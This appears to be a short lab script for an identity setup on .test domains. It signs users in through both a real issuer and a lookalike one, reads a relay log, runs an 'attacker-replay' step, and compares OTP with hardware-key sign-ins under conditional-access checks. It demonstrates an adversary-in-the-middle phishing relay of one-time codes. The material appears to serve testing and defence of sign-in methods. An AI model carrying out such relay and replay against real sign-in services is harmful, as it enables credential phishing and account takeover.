iss=https://login.shop.test/realms/shop
fake=https://login.shop-help.test/realms/shop
red=http://127.0.0.1:8400/callback
on office signin --code trace-cli $red $iss ana --otp-secret "$(cat /etc/idlab/otp/ana)" | head -c 140; echo
for i in $(seq 1 20); do on office curl -sk -m 2 -o /dev/null $fake/.well-known/openid-configuration && break; sleep 1; done
on office signin --code trace-cli $red $fake ana --otp-secret "$(cat /etc/idlab/otp/ana)" | head -c 140; echo
cat /srv/relay.log
on attacker attacker-replay
on office signin --code trace-cli $red $iss alice --key /etc/idlab/keys/alice.key | head -c 140; echo
on office signin --code trace-cli $red $fake alice --key /etc/idlab/keys/alice.key
on idp ca-whatif alice admin-app methods=pwd,otp
on idp ca-whatif alice admin-app methods=pwd,hwk
